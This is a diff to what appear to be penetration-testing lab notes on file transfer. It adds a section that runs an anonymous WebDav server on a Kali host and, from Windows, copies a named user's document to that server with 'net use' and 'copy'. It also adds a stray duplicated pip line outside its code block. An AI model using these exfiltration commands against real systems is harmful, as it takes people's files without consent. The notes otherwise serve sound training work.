@@ -382,7 +382,7 @@ When you use SMB, it will first attempt to connect using the SMB protocol, and i
 #### Configuring WebDav Server
 
 To set up our [WebDav server](webdav-wsgidav.md), we need to install two Python modules, wsgidav and cheroot.
-
+pip install wsgidav cheroot
 
 ```bash
 pip install wsgidav cheroot
@@ -406,6 +406,23 @@ copy C:\Users\john\Desktop\SourceCode.zip \\$ipServer\DavWWWRoot\
 ```
 
 If there are no SMB (TCP/445) restrictions, you can use impacket-smbserver the same way we set it up for download operations.
+
+
+#### Another WebDav Server way
+
+```
+mkdir webdav
+cd webdav
+wsgidav --host=0.0.0.0 --port=80 --root=/home/kali/share/ZEUS/webdav --auth=anonymous 
+```
+
+In the windows:
+
+```
+net use Z: http://192.168.45.182/
+copy "c:\Users\z.thomas\Downloads\Onboarding Document.docx" Z:\  
+```
+
 
 
 
